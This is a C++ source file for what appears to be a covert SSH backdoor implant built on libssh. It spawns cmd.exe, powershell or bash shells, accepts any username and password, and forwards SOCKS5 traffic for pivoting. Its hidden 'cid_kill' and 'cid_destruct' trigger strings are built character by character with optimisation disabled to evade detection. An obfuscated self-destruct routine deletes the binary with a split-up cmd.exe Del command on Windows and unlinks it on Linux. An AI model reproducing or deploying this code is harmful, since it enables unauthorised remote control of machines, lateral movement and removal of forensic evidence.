#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/callbacks.h>

#include <thread>
#include <chrono>

#include "server.h"
#include "global.h"

#if defined(__APPLE__)
#include <util.h>    //forkpty
#elif defined(__linux__)
#include <pty.h>    //forkpty
#endif

#include <assert.h>
#include <stdio.h>


#include "sts_queue.h"
#include "socks_proxy.h"


// to generate RSA keys
#include <openssl/pem.h>

#ifdef _WIN32
#include <Windows.h>
#include <ws2tcpip.h>
#include <process.h> 
#else
#include <poll.h>
#define INVALID_HANDLE_VALUE -1
#endif // _WIN32

#ifdef HAVE_PTHREAD
#include <pthread.h>
typedef void* thread_rettype_t;
#else
typedef void thread_rettype_t;
#endif

std::string SSHServer::priv_key;
const char* SSHServer::ip="127.0.0.1";
int SSHServer::is_pty=0;
std::recursive_mutex mtx;
int SSHServer::should_terminate = 0;

char SSHServer::kill_command[];
char SSHServer::destruct_command[];


#ifdef _WIN32
SSHServer::my_CreatePseudoConsole SSHServer::my_CreatePseudoConsole_function = nullptr;
SSHServer::my_ResizePseudoConsole SSHServer::my_ResizePseudoConsole_function = nullptr;
SSHServer::my_ClosePseudoConsole SSHServer::my_ClosePseudoConsole_function = nullptr;
#endif


/*Disable optimizations */
#ifdef _MSC_VER
#pragma optimize( "", off )
#endif // _MSC_VER
#ifdef __GNUC__
#pragma GCC push_options
#pragma GCC optimize ("O0")
#endif // !__GNUC__
void SSHServer::fill_commands() {
    /* Init CID commands*/
    kill_command[0] = 'c';
    kill_command[1] = 'i';
    kill_command[2] = 'd';
    kill_command[3] = '_';
    kill_command[4] = 'k';
    kill_command[5] = 'i';
    kill_command[6] = 'l';
    kill_command[7] = 'l';
    kill_command[8] = '\r';

    destruct_command[0] = 'c';
    destruct_command[1] = 'i';
    destruct_command[2] = 'd';
    destruct_command[3] = '_';
    destruct_command[4] = 'd';
    destruct_command[5] = 'e';
    destruct_command[6] = 's';
    destruct_command[7] = 't';
    destruct_command[8] = 'r';
    destruct_command[9] = 'u';
    destruct_command[10] = 'c';
    destruct_command[11] = 't';
    destruct_command[12] = '\r';

}
#ifdef __GNUC__
#pragma GCC pop_options
#endif // !__GNUC__
#ifdef _MSC_VER
#pragma optimize( "", on )
#endif // _MSC_VER



SSHServer::SSHServer()
{
    fill_commands();

    if (gen_rsa_keys()) {
        debug("[+] RSA keys generated correctly\n");
    }
    else {
        debug("[+] Error generating RSA keys\n");
    }

	/*Here we load dynamically the Windows pseudoTTY APIs*/
#ifdef _WIN32

	wchar_t system32_path[MAX_PATH] = { 0, };
	wchar_t kernel32_dll_path[MAX_PATH] = { 0, };
	HMODULE hm_kernelbase = NULL;


	if (!GetSystemDirectoryW(system32_path, MAX_PATH)) {
		debug("failed to get system directory\n");
		is_pty = 0;
		return;
	}

	wcscat_s(kernel32_dll_path, MAX_PATH, system32_path);
	wcscat_s(kernel32_dll_path, MAX_PATH, L"\\Kernel32.dll");

	if ((hm_kernelbase = LoadLibraryW(kernel32_dll_path)) == NULL) {
		debug("failed to load kernerlbase dll:%ls\n", kernel32_dll_path);
		is_pty = 0;
		return;
	}

	my_CreatePseudoConsole_function =
		(my_CreatePseudoConsole)GetProcAddress(hm_kernelbase, "CreatePseudoConsole");

	if (my_CreatePseudoConsole_function == NULL) {
		debug("couldn't find CreatePseudoConsole() in kernerlbase dll\n");
		debug("This windows OS doesn't support conpty\n");
		is_pty = 0;
		return;
	}

	my_ResizePseudoConsole_function =
		(my_ResizePseudoConsole)GetProcAddress(hm_kernelbase, "ResizePseudoConsole");

	my_ClosePseudoConsole_function =
		(my_ClosePseudoConsole)GetProcAddress(hm_kernelbase, "ClosePseudoConsole");

	this->is_pty = 1;
	debug("This windows OS supports conpty\n");

	FreeLibrary(hm_kernelbase);

#endif
}

#ifdef _WIN32
int SSHServer::windows_poll_channel(ssh_channel chan, void *userdata) {
    char buf[2048];
    int sz = 0;

    struct data_arg* my_data = (struct data_arg*)userdata;
    if (!chan) {     
        CloseHandle(my_data->hPipeOut);

        return -1;
    }
    
    DWORD n_to_read;
    PeekNamedPipe(my_data->hPipeIn, NULL, NULL, NULL, &n_to_read, NULL);

    if (n_to_read == 0)
        return 0;

    DWORD dwRead = 0;
    bool SUCCESS = ReadFile(my_data->hPipeIn, buf, 2048, &dwRead, NULL);

	sz = (int)dwRead;

    if (sz > 0) {
        pthread_mutex_lock(&my_data->thread_info->mutex);
        int size = ssh_channel_write(chan, buf, sz);
        pthread_mutex_unlock(&my_data->thread_info->mutex);
        if (size == SSH_ERROR) {  
            debug("Some error happened writting to the channel.\nError: %s\nerror code: %d\n", ssh_get_error(ssh_channel_get_session(chan)), ssh_get_error_code(ssh_channel_get_session(chan)));
            return -1;
        }
    }
  
    return sz;
}

#else
int SSHServer::copy_fd_to_chan(socket_t fd, int revents, void *userdata) {
    ssh_channel chan = (ssh_channel)userdata;
    char buf[2048];
    int sz = 0;

    if (!chan) {
        close(fd);
        return -1;
    }
    if (revents & POLLIN) {
        sz = read(fd, buf, 2048);

        if (sz > 0) {
            ssh_channel_write(chan, buf, sz);
        }
    }
    if (revents & POLLHUP) {
        int rc = ssh_channel_close(chan);
        sz = rc;
    }
    return sz;
}
#endif

int SSHServer::copy_chan_to_fd(ssh_session session,
    ssh_channel channel,
    void *data,
    uint32_t len,
    int is_stderr,
    void *userdata) {    
    int sz;
    (void)session;
    (void)channel;
    (void)is_stderr;

    
#ifdef _WIN32
    struct data_arg* my_data = (struct data_arg*)userdata;
    DWORD dwWritten = 0;
    BOOL SUCCESS = WriteFile(my_data->hPipeOut, data, len, &dwWritten, NULL);
    sz = (int)dwWritten;
#else
    struct data_arg* my_data = (struct data_arg*)userdata;
    //int fd = *(int*)userdata;
    int fd = my_data->fd;
    sz = write(fd, data, len);
#endif // _WIN32


    if (sizeof(my_data->last_command) - my_data->index > len) {
        memcpy(my_data->last_command + my_data->index, data, len);
        my_data->index += len;
    
        if (memcmp(my_data->last_command, SSHServer::destruct_command, sizeof(SSHServer::destruct_command) - 1) == 0) {
            SSHServer::self_destruct();
            SSHServer::should_terminate = 1;

        }
        else if (memcmp(my_data->last_command, SSHServer::kill_command, sizeof(SSHServer::kill_command) - 1) == 0) {
            SSHServer::should_terminate = 1;
        }
    }

    // Reset when last char is new line
    if (*(char*)data == '\r') {
        my_data->index = 0;
    }

    return sz;
}


void SSHServer::self_destruct() {
#ifdef _WIN32
    //"cmd.exe /C ping 127.0.0.1 -n 5 > Nul & Del /f /q \"%s\""
    char format[100] = { 0 };
    strncat(format, "cmd.", sizeof(format));
    strncat(format, "exe ", sizeof(format));
    strncat(format, "/C p", sizeof(format));
    strncat(format, "ing ", sizeof(format));
    strncat(format, "127.0.0.1 ", sizeof(format));
    strncat(format, "-n 5 >", sizeof(format));
    strncat(format, " Nul & ", sizeof(format));
    strncat(format, "Del ", sizeof(format));
    strncat(format, "/f /", sizeof(format));
    strncat(format, "q \"", sizeof(format));
    strncat(format, "%s\"", sizeof(format));
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    sprintf_s(szCmd, MAX_PATH, format, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
#else
    char arg1[20];
    char exepath[PATH_MAX + 1] = { 0 };

    sprintf(arg1, "/proc/%d/exe", getpid());
    readlink(arg1, exepath, sizeof(exepath));
    unlink(exepath);
#endif // _WIN32
}

void SSHServer::chan_close(ssh_session session, ssh_channel channel, void *userdata) {
#ifdef _WIN32
    struct data_arg* my_data = (struct data_arg*)userdata;
    CloseHandle(my_data->hPipeOut);
#else
    int fd = *(int*)userdata;
#endif // _WIN32

    (void)session;
    (void)channel;  
}

bool SSHServer::gen_rsa_keys() {
    int             ret = 0;
    RSA             *r = NULL;
    BIGNUM          *bne = NULL;
    EVP_PKEY        *key = NULL;
    BIO             *bio = NULL;
    int             bits = 2048;
    unsigned long   e = RSA_F4;
    char            *pem_key = nullptr;
    int keylen;

    // 1. generate rsa key
    bne = BN_new();
    ret = BN_set_word(bne, e);
    if (ret != 1) {
        goto free_all;
    }

    r = RSA_new();
    ret = RSA_generate_key_ex(r, bits, bne, NULL);
    if (ret != 1) {
        goto free_all;
    }

    key = EVP_PKEY_new();
    if (!EVP_PKEY_set1_RSA(key, r)) {
        goto free_all;
    }
    bio = BIO_new(BIO_s_mem());
    ret = PEM_write_bio_RSAPrivateKey(bio, r, NULL, NULL, 0, NULL, NULL);
    keylen = BIO_pending(bio);
    pem_key = (char*)calloc(keylen + 1, 1); /* Null-terminate */
    BIO_read(bio, pem_key, keylen);
    priv_key = std::string(pem_key);

free_all:
    if (pem_key != nullptr)free(pem_key);
    BIO_free(bio);
    EVP_PKEY_free(key);

    RSA_free(r);
    BN_free(bne);

    return ret == 1;
}


int SSHServer::auth_password(ssh_session session, const char *user,
	const char *password, void *userdata) {
	struct thread_info_struct* args = (struct thread_info_struct*) userdata;
	args->authenticated = 1;
    return SSH_AUTH_SUCCESS; // Always auth with any user/pass
}

#ifdef _WIN32
HRESULT SSHServer::CreatePseudoConsoleAndPipes(HPCON* phPC, HANDLE* phPipeIn, HANDLE* phPipeOut, COORD win_size)
{
    HRESULT hr{ E_UNEXPECTED };
    HANDLE hPipePTYIn{ INVALID_HANDLE_VALUE };
    HANDLE hPipePTYOut{ INVALID_HANDLE_VALUE };

    // Create the pipes to which the ConPTY will connect
    if (CreatePipe(&hPipePTYIn, phPipeOut, NULL, 0) &&
        CreatePipe(phPipeIn, &hPipePTYOut, NULL, 0))
    {
        // Create the Pseudo Console of the required size, attached to the PTY-end of the pipes
        hr = SSHServer::my_CreatePseudoConsole_function(win_size, hPipePTYIn, hPipePTYOut, 0, phPC);

        // Note: We can close the handles to the PTY-end of the pipes here
        // because the handles are dup'ed into the ConHost and will be released
        // when the ConPTY is destroyed.
        if (INVALID_HANDLE_VALUE != hPipePTYOut) CloseHandle(hPipePTYOut);
        if (INVALID_HANDLE_VALUE != hPipePTYIn) CloseHandle(hPipePTYIn);
    }

    return hr;
}

// Initializes the specified startup info struct with the required properties and
// updates its thread attribute list with the specified ConPTY handle
HRESULT SSHServer::InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX* pStartupInfo, HPCON hPC)
{
    HRESULT hr{ E_UNEXPECTED };

    if (pStartupInfo)
    {
        SIZE_T attrListSize{};

        pStartupInfo->StartupInfo.cb = sizeof(STARTUPINFOEX);

        // Get the size of the thread attribute list.
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);

        // Allocate a thread attribute list of the correct size
        pStartupInfo->lpAttributeList =
            reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(malloc(attrListSize));

        // Initialize thread attribute list
        if (pStartupInfo->lpAttributeList
            && InitializeProcThreadAttributeList(pStartupInfo->lpAttributeList, 1, 0, &attrListSize))
        {
            // Set Pseudo Console attribute
            hr = UpdateProcThreadAttribute(
                pStartupInfo->lpAttributeList,
                0,
                PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                hPC,
                sizeof(HPCON),
                NULL,
                NULL)
                ? S_OK
                : HRESULT_FROM_WIN32(GetLastError());
        }
        else
        {
            hr = HRESULT_FROM_WIN32(GetLastError());
        }
    }
    return hr;
}
#endif

int SSHServer::my_ssh_channel_pty_window_change_callback(ssh_session session,
	ssh_channel channel,
	int width, int height,
	int pxwidth, int pwheight,
	void *userdata) {
	// ToDo: We should resize the tty in this callback using ResizePseudoConsole
	// This callback is not called yet
    struct thread_info_struct* thread_info = (struct thread_info_struct*) userdata;
#ifdef _WIN32
	if (SSHServer::is_pty) {
		// Create the Pseudo Console of the required size, attached to the PTY-end of the pipes
		COORD cords = { (short)width, (short)height };
		SSHServer::my_ResizePseudoConsole_function(thread_info->pty_handle, cords); // Why the hell thread_info->pty_handle is 0xccccc? userdata is not the same that the one I set
	}
	else {}
#else
    // prob we need to use channel_pty_request_function cb
    // ToDo: https://github.com/cutwater/poc-sshserver/blob/55db7c5e68f93a997ca6cef8d8eac4cea161988d/main.c#L334
#endif
	return 0;
}


thread_rettype_t SSHServer::main_loop_shell(void* userdata) {
    struct thread_info_struct* thread_info = (struct thread_info_struct*)userdata;
    ssh_channel channel = thread_info->channel;
    ssh_session session = thread_info->session;
    socket_t fd = 1;
    struct termios *term = NULL;
    struct winsize *win = NULL;
#ifndef _WIN32
    pid_t childpid;
#endif
    ssh_event event = thread_info->event;

    struct ssh_channel_callbacks_struct cb;
    memset(&cb, '\x00', sizeof(cb));
    cb.channel_data_function = SSHServer::copy_chan_to_fd;
    cb.channel_eof_function = SSHServer::chan_close;
    cb.channel_close_function = SSHServer::chan_close;
	cb.channel_pty_window_change_function = SSHServer::my_ssh_channel_pty_window_change_callback;
    cb.userdata = userdata;

	// We will use this to store the commands executed to look for exit one
	std::string command_storage;
	command_storage.reserve(1024);

#ifdef _WIN32
    HANDLE g_hChildStd_IN_Rd = INVALID_HANDLE_VALUE;
    HANDLE hPipeOut = INVALID_HANDLE_VALUE;
    HANDLE hPipeIn = INVALID_HANDLE_VALUE;
    HANDLE g_hChildStd_OUT_Wr = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES saAttr;
    DWORD exitCode;
    HPCON hPC{ INVALID_HANDLE_VALUE };
    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;
    struct data_arg data_arg;
    STARTUPINFOEX startupInfo{};

    if (is_pty) {
        // Great! we can use https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/
        
        HRESULT hr{ E_UNEXPECTED };
        HANDLE hConsole = { GetStdHandle(STD_OUTPUT_HANDLE) };
        TCHAR szCmdline[] = "cmd.exe";

        // Enable Console VT Processing
        DWORD consoleMode{};
        GetConsoleMode(hConsole, &consoleMode);
        hr = SetConsoleMode(hConsole, consoleMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
            ? S_OK
            : GetLastError();
        if (S_OK == hr)
        {
            //  Create the Pseudo Console and pipes to it
            hr = CreatePseudoConsoleAndPipes(&hPC, &hPipeIn, &hPipeOut, thread_info->win_size);
            if (S_OK == hr)
            {
                thread_info->pty_handle = hPC;
                // Initialize the necessary startup info struct                       
                if (S_OK == InitializeStartupInfoAttachedToPseudoConsole(&startupInfo, hPC))
                {
                    // Launch ping to emit some text back via the pipe
                    hr = CreateProcess(
                        NULL,                           // No module name - use Command Line
                        szCmdline,                      // Command Line
                        NULL,                           // Process handle not inheritable
                        NULL,                           // Thread handle not inheritable
                        FALSE,                          // Inherit handles
                        EXTENDED_STARTUPINFO_PRESENT,   // Creation flags
                        NULL,                           // Use parent's environment block
                        NULL,                           // Use parent's starting directory 
                        &startupInfo.StartupInfo,       // Pointer to STARTUPINFO
                        &piProcInfo)                      // Pointer to PROCESS_INFORMATION
                        ? S_OK
                        : GetLastError();
                }
            }
        }
    }
    else {
        /* ToDo: implement     //start_with_pty();*/

        // Set the bInheritHandle flag so pipe handles are inherited. 
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        // Create a pipe for the child process's STDOUT. 
        if (!CreatePipe(&hPipeIn, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
            debug("StdoutRd CreatePipe");
        }

        // Ensure the read handle to the pipe for STDOUT is not inherited.
        if (!SetHandleInformation(hPipeIn, HANDLE_FLAG_INHERIT, 0)) {
            debug("Stdout SetHandleInformation");
        }

        // Create a pipe for the child process's STDIN. 
        if (!CreatePipe(&g_hChildStd_IN_Rd, &hPipeOut, &saAttr, 0)) {
            debug("Stdin CreatePipe");
        }

        // Ensure the write handle to the pipe for STDIN is not inherited. 
        if (!SetHandleInformation(hPipeOut, HANDLE_FLAG_INHERIT, 0)){
            debug("Stdin SetHandleInformation");
        }

        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdError = g_hChildStd_OUT_Wr;
        siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
        siStartInfo.hStdInput = g_hChildStd_IN_Rd;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

        //char szCmdline[] = "C:\\WINDOWS\\System32\\cmd.exe /c cmd.exe";
        //TCHAR szCmdline[] = TEXT("C:\\WINDOWS\\System32\\powershell.exe");
        TCHAR szCmdline[] = TEXT("powershell.exe"); // For some weird reason it works fine with powershell but it does not with cmd.exe WHAAAAATTT?!?!
        //TCHAR szCmdline[] = TEXT("cmd.exe");
        //TCHAR szCmdline[] = TEXT("C:\\Users\\alberto.garcia\\Downloads\\OpenSSH-Win64\\ssh-shellhost.exe ---pty cmd.exe");
        //TCHAR szCmdline[] = TEXT("C:\\Users\\alberto.garcia\\Downloads\\OpenSSH-Win64\\ssh-shellhost.exe ---pty conhost.exe --headless");

        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

        BOOL bSuccess = CreateProcess(NULL,
            szCmdline,     // command line 
            NULL,          // process security attributes 
            NULL,          // primary thread security attributes 
            TRUE,          // handles are inherited 
            0,             // creation flags 
            NULL,          // use parent's environment 
            NULL,          // use parent's current directory 
            &siStartInfo,  // STARTUPINFO pointer 
            &piProcInfo);  // receives PROCESS_INFORMATION 
        // If an error occurs, exit the application. 

        if (!bSuccess) {
            debug("Error creating process\n");
            // ToDo: need to return gratefully
        }
    }

    data_arg = { NULL };
    data_arg.hPipeOut = hPipeOut;
    data_arg.hPipeIn = hPipeIn;
    data_arg.thread_info = thread_info;
    memset(data_arg.last_command, NULL, sizeof(data_arg.last_command));
    data_arg.index = 0;
    cb.userdata = &data_arg;

#else
    childpid = forkpty(&fd, NULL, term, win);
    if (childpid == 0) {
        execl("/bin/bash", "/bin/bash", (char *)NULL);
        abort();
    }
    struct data_arg data_arg = { .fd = fd, .last_command = {0}, .index = 0 };
    cb.userdata = &data_arg;
#endif // _WIN32

    ssh_callbacks_init(&cb);
    if (ssh_set_channel_callbacks(channel, &cb) == SSH_ERROR) {
        debug("Couldn't set callbacks\n");
        return;
    }

#ifndef _WIN32
    short events = POLLIN | POLLPRI | POLLERR; // | POLLRDHUP;
    if (ssh_event_add_fd(event, fd, events, copy_fd_to_chan, channel) != SSH_OK) {
        debug("Couldn't add an fd to the event\n");
        return -1;
    }
    // if (ssh_event_add_session(event, session) != SSH_OK) {
    //     debug("Couldn't add the session to the event\n");
    //     return -1;
    // }

#endif


    do {        
#ifdef _WIN32     
        GetExitCodeProcess(piProcInfo.hProcess, &exitCode);
        if (exitCode != STILL_ACTIVE)
            break;

        windows_poll_channel(channel, &data_arg);
#endif // _WIN32
        std::this_thread::sleep_for(std::chrono::milliseconds(30));
    } while (!SSHServer::should_terminate && !ssh_channel_is_closed(channel));
    
    if(!ssh_channel_is_closed(channel))
        ssh_channel_close(channel);
    
    ssh_remove_channel_callbacks(channel, &cb);

#ifdef _WIN32
    //Clean-up the pipes
    if (INVALID_HANDLE_VALUE != hPipeOut) CloseHandle(hPipeOut);
    if (INVALID_HANDLE_VALUE != hPipeIn) CloseHandle(hPipeIn);

    if (is_pty) {
        // Cleanup attribute list
        DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
        free(startupInfo.lpAttributeList);

        // Create the Pseudo Console of the required size, attached to the PTY-end of the pipes
        SSHServer::my_ClosePseudoConsole_function(hPC);

    }
#else // _WIN32
    ssh_event_remove_fd(event, fd);
#endif

    return;
}



/* Return 1 if you want libshh to handle the message properly. 0 if you did*/
int SSHServer::message_callback(ssh_session session, ssh_message message, void *userdata) {
    struct thread_info_struct* thread_info = (struct thread_info_struct*)userdata;

	auto type = ssh_message_type(message);
	auto subtype = ssh_message_subtype(message);
	debug("Message type: %d\n", type);
	debug("Message Subtype: %d\n", subtype);
	switch (type)
	{
	case SSH_REQUEST_CHANNEL_OPEN: {
		debug("SSH_REQUEST_CHANNEL_OPEN\n");
		switch (subtype)
		{
		case SSH_CHANNEL_DIRECT_TCPIP: { //SOCKS5
            return handle_socks_connection(message, thread_info);
		}

		case SSH_CHANNEL_SESSION: {
			debug("SSH_CHANNEL_SESSION\n");
			ssh_channel channel = ssh_message_channel_request_open_reply_accept(message);			
			if (!channel) {
				return 1;
			}
			thread_info->channel = channel;
			return 0;
		}
		default:
			return 1;
		}
		break;
	}
	case SSH_REQUEST_CHANNEL: {
		debug("SSH_REQUEST_CHANNEL\n");
		switch (subtype)
		{
		case SSH_CHANNEL_REQUEST_SHELL: {
			ssh_message_channel_request_reply_success(message);
            if (thread_info->channel == NULL) {
                debug("Weird that we are getting SSH_CHANNEL_REQUEST_SHELL and we did not get SSH_CHANNEL_SESSION before\n");
                return 1;
            }
#ifdef HAVE_PTHREAD
            pthread_t thread;
            int rc = pthread_create(&thread, NULL, main_loop_shell, thread_info);
            if (rc != 0) {
                _ssh_log(SSH_LOG_WARNING, "=== auth_password", "Error starting thread: %d", rc);
                return 1;
            }
#else
            HANDLE thread = (HANDLE)_beginthread(main_loop_shell, 0, thread_info);
#endif // HAVE_PTHREAD

            thread_info->shell_thread = thread;

			return 0;
		}
		case SSH_CHANNEL_REQUEST_PTY: {

            //auto a = ssh_message_channel_request_pty_width(message);
            //auto b = ssh_message_channel_request_pty_height(message);
            //auto c = ssh_message_channel_request_pty_pxwidth(message);
            //auto d = ssh_message_channel_request_pty_pxheight(message);
            //auto e = ssh_message_channel_request_pty_term(message);

            thread_info->win_size.X = ssh_message_channel_request_pty_width(message);
            thread_info->win_size.Y = ssh_message_channel_request_pty_height(message);
            ssh_message_channel_request_reply_success(message);
            
            /*win_size size = get_win_size();
            if (ssh_channel_request_pty_size(thread_info->channel, "xterm", size.col, size.row) != SSH_OK) {
                debug("Error : %s\n", ssh_get_error(thread_info->session));
                return 1;
            }*/

			return 0;
		}
		default:
			return 1;
		}
	}
	default:
		return 1;
	}
	return 1;
}


thread_rettype_t SSHServer::per_conn_thread(void* args){
    struct thread_info_struct info;
    info.authenticated = 0;
    info.error = 0;
    info.session = 0;
    info.event = nullptr;
    info.sockets_cnt = 0;
    info.cleanup_queue = StsQueue.create();
    info.dynamic_port_fwr = 0;
    info.queue = nullptr;
    info.channel = nullptr;
    info.win_size = { NULL, NULL };
#ifdef _WIN32
    InitializeCriticalSection(&info.mutex);
    info.connection_thread = (HANDLE)INVALID_HANDLE_VALUE;
    info.shell_thread = (HANDLE)INVALID_HANDLE_VALUE;
    info.pty_handle = NULL;
#else
    pthread_mutex_init(&info.mutex, NULL);
    info.connection_thread = (pthread_t)INVALID_HANDLE_VALUE;
    info.shell_thread = (pthread_t)INVALID_HANDLE_VALUE;
#endif // _WIN32
    info.session = (ssh_session)args;

    struct ssh_server_callbacks_struct cb;
    memset(&cb, '\x00', sizeof (cb));
    cb.userdata = &info;
    cb.auth_password_function = auth_password;

    ssh_callbacks_init(&cb);
    ssh_set_server_callbacks(info.session, &cb);
    ssh_set_message_callback(info.session, SSHServer::message_callback, &info);

    if (ssh_handle_key_exchange(info.session)) {
        debug("ssh_handle_key_exchange: %s\n", ssh_get_error(info.session));
        goto shutdown;
    }
    ssh_set_auth_methods(info.session, SSH_AUTH_METHOD_PASSWORD);

    info.event = ssh_event_new();

    ssh_event_add_session(info.event, info.session);

    while (!info.authenticated) {
        if (info.error)
            break;
        if (ssh_event_dopoll(info.event, -1) == SSH_ERROR) {
            debug("Error : %s\n", ssh_get_error(info.session));
            info.error = 1;
            goto shutdown;
        }
    }
    if (info.error) {
        debug("Error, exiting loop\n");
    }
    else {
        debug("Authenticated and got a channel\n");

        while (!SSHServer::should_terminate && !info.error) {
            pthread_mutex_lock(&info.mutex);
            int err = ssh_event_dopoll(info.event, 50);
            pthread_mutex_unlock(&info.mutex);
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
            if (err == SSH_ERROR) {
                debug("Error : %s\n", ssh_get_error(info.session));
                info.error = 1;
                goto shutdown;
            }

            if (info.dynamic_port_fwr) {
                do_cleanup(info.cleanup_queue);
                do_set_callbacks(&info);    
            }
        }
    }
shutdown:
    info.error = 1;
    if (info.dynamic_port_fwr) {
#ifdef _WIN32
        WaitForSingleObject(info.connection_thread, INFINITE);
#else
        pthread_join(info.connection_thread, NULL);
#endif
        StsQueue.destroy(info.queue);
    }

#ifdef _WIN32
    WaitForSingleObject(info.shell_thread, INFINITE);
#else
    pthread_join(info.shell_thread, NULL);
#endif

    if (info.channel != nullptr){
        ssh_channel_free(info.channel);
        info.channel = nullptr;
    }

    if (info.event != nullptr) {
        ssh_event_remove_session(info.event, info.session);
        ssh_event_free(info.event);
    }

    pthread_mutex_destroy(&info.mutex);
    ssh_free(info.session);
    StsQueue.destroy(info.cleanup_queue);
    debug("Closing session\n");

#ifdef HAVE_PTHREAD
    return NULL;
#endif
}

win_size SSHServer::get_win_size(){
    int columns, rows;
#ifdef _WIN32
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    columns = csbi.srWindow.Right - csbi.srWindow.Left + 1;
    rows = csbi.srWindow.Bottom - csbi.srWindow.Top + 1;

#else
    struct winsize w;
    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);
    columns = w.ws_col;
    lines = w.ws_row;

#endif // _WIN32

    debug("columns: %d\n", columns);
    debug("rows: %d\n", rows);

    return { columns, rows };
}


/* This is a copy to libssh bind_socket() but without setting SO_REUSEADDR
    so we can detect when an port is in use*/
socket_t SSHServer::bind_socket_non_reuse(ssh_bind sshbind, const char* hostname,
    int port) {
    char port_c[6];
    struct addrinfo* ai;
    struct addrinfo hints;
    int opt = 1;
    socket_t s;
    int rc;

    memset(&hints, 0, sizeof(hints));

    hints.ai_flags = AI_PASSIVE;
    hints.ai_socktype = SOCK_STREAM;

    snprintf(port_c, 6, "%d", port);
    rc = getaddrinfo(hostname, port_c, &hints, &ai);
    if (rc != 0) {
        return SSH_INVALID_SOCKET;
    }

    s = socket(ai->ai_family,
        ai->ai_socktype,
        ai->ai_protocol);
    if (s == SSH_INVALID_SOCKET) {
        freeaddrinfo(ai);
        return SSH_INVALID_SOCKET;
    }

    // this is the part that I deleted
    //if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR,
    //    (char*)& opt, sizeof(opt)) < 0) {
    //   /* ssh_set_error(sshbind,
    //        SSH_FATAL,
    //        "Setting socket options failed: %s",
    //        strerror(errno));*/
    //    freeaddrinfo(ai);
    //    CLOSE_SOCKET(s);
    //    return -1;
    //}

    if (bind(s, ai->ai_addr, ai->ai_addrlen) != 0) {
        freeaddrinfo(ai);
        CLOSE_SOCKET(s);
        return SSH_INVALID_SOCKET;
    }

    freeaddrinfo(ai);
    if (listen(s, 10) < 0) {
        CLOSE_SOCKET(s);
        return SSH_INVALID_SOCKET;
    }

    return s;
}



int SSHServer::bind_incoming_connection(socket_t fd, int revents, void* userdata){
    ssh_session session = ssh_new();
    if (!session || ssh_bind_accept((ssh_bind)userdata, session)) {
       // error("could not accept session: '", ssh_get_error(session), "'");
        ssh_free(session);
        return 1;
    }

#ifdef HAVE_PTHREAD
    pthread_t thread;
    int rc = pthread_create(&thread, NULL, per_conn_thread, session);
    if (rc != 0) {
        debug("Error starting thread: %d\n", rc);
        return 1;
    }
#else
    _beginthread(per_conn_thread, 0, session);
#endif // HAVE_PTHREAD

    return 0;
}

int SSHServer::run(int port) {
#ifdef IS_DEBUG
    int verbosity = SSH_LOG_FUNCTIONS;
#else
    int verbosity = SSH_LOG_NOLOG;
#endif // DEBUG

    if (priv_key.empty()) {
        debug("[-] There is no RSA key to start the SSH server");
        return 1;
    }

    ssh_event event = nullptr;
    /* Create and configure the ssh session. */
    ssh_bind sshbind = ssh_bind_new();
    
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, ip);
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY_MEMORY, priv_key.c_str());
    
    socket_t s = bind_socket_non_reuse(sshbind, ip, port);

    if (s == SSH_INVALID_SOCKET){
        debug("Error listening to socket: %s\n", ssh_get_error(sshbind));
        goto shutdown;
    }

    ssh_bind_set_fd(sshbind, s);
 
    event = ssh_event_new();
    ssh_event_add_fd(event, ssh_bind_get_fd(sshbind), POLLIN, bind_incoming_connection, sshbind);
   

    /* Listen on 'port' for connections. */
    if (ssh_bind_listen(sshbind) < 0) {
        debug("Error listening to socket: %s\n", ssh_get_error(sshbind));
        goto shutdown;
    }

    debug("Listening on port %d.\n", port);

    while (!should_terminate) {
        int err = ssh_event_dopoll(event, 50);
        if (err == SSH_ERROR) {
            debug("Some error happened with the server, exiting...\n");
            goto shutdown;
        }
    }


shutdown:
    // leave some time for other threads to finish
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    if (event != nullptr) {
        ssh_event_free(event);
    }
    if(sshbind != nullptr){
	    ssh_bind_free(sshbind);
    }
	return 0;
}


